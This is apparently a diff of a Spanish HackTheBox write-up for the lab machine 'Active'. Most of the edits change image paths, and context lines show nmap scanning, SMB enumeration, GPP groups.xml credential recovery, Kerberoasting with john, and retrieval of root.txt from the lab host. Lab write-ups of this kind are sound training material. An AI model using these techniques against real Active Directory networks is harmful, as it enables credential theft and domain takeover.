@@ -1,3 +1,6 @@
+ 
+
+```markdown
 # Máquina "Active" de HackTheBox
 
 ## Características
@@ -49,7 +52,7 @@ sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,491
 crackmapexec smb 10.10.10.100
 ```
 
-![Identificación del dominio](imagenes/active/smb1.png)
+![Identificación del dominio](/secciones/posts/imagenes/active/smb1.png)
 
 ## Enumeración SMB
 
@@ -86,7 +89,7 @@ dr--r--r--                0 Sat Jul 21 06:37:44 2018    scripts
 smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{GUID}/MACHINE/Preferences/Groups/groups.xml
 ```
 
-![Archivo groups.xml](imagenes/active/xml.png)
+![Archivo groups.xml](/secciones/posts/imagenes/active/xml.png)
 
 ### Desencriptación
 
@@ -108,7 +111,7 @@ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'clave_desencriptada'
 rpcclient -U "SVC_TGS%clave" 10.10.10.100 -c 'enumdomgroups'
 ```
 
-![Enumeración de grupos](imagenes/active/enum.png)
+![Enumeración de grupos](/secciones/posts/imagenes/active/enum.png)
 
 ### Ataque Kerberoasting
 
@@ -130,6 +133,4 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 smbmap -H 10.10.10.100 -u 'Administrator' -p 'clave_admin' --download Users/Administrator/Desktop/root.txt
 ```
 
-## Notas
-
-Algunos procedimientos pueden variar según la configuración del sistema. Si encuentras errores o tienes sugerencias, contacta a: lerioxirit@proton.me
+ 
